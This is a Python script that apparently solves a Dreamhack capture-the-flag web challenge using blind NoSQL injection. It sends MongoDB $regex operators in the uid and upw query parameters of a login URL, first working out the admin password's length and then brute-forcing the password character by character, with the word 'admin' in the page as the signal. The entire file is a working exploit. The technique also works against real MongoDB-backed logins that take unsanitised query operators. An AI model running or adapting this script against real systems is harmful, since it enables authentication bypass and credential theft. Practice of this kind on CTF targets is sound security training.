import string, requests


def pwLength(url, cookie):
    for i in range(50, -1, -1):
        uid = "uid[$regex]=ad.{3}"
        upw = "upw[$regex]=.{" + str(i) + "}"
        query = uid + "&" + upw

        res = requests.get(url + query, cookies={"user": cookie})

        if "admin" in res.text:
            print(f"upw length : {i}")
            return i


def pwParser(url, cookie, pw_length):
    pw = ""
    for length in range(pw_length - 3, -1, -1):
        for s in "{}" + string.digits + string.ascii_letters:
            uid = "uid[$regex]=ad.{3}"
            upw = "upw[$regex]=" + pw + s + ".{" + str(length) + "}"
            query = uid + "&" + upw

            res = requests.get(url + query, cookies={"user": cookie})

            if "admin" in res.text:
                pw += s
                print(f"upw : {pw}")
                break


if __name__ == "__main__":
    port = int(input("port input\n>> "))
    url = f"http://host3.dreamhack.games:{port}/login?"

    cookie = input("cookie input\n>> ")

    pw_length = pwLength(url, cookie)
    pwParser(url, cookie, pw_length)
